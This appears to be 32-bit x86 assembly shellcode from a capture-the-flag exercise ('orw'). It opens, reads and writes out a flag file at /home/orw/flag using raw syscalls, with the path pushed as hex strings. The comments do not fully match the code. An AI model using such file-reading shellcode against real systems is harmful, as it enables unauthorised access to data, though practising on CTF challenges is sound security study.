.globl main
.type main,@function

main:
	# f= open("/home/orw/flag", O_RDONLY)
	xor %ecx, %ecx;
	xor %edx, %edx;
	push %ecx;
	push $0x67616c66;
	push $0x2f77726f;
	push $0x2f656d6f;
	push $0x682f2f2e;
	push %esp;
	pop %ebx;
	mov $0x5, %eax;
	int $0x80

	# read(f, 0x804a060, 0x40)
	mov %eax, %ebx;
	mov $0x3, %eax;
	mov $0x804a060, %ecx;
	mov $0x40, %edx;
	int $0x80;

	# write(f, 0x804a060, 0x40)
	mov $0x1, %ebx;
	# mov $0x840a060, %ecx;
	# mov $0x40, %edx;
	mov $0x4, %eax;
	int $0x80;

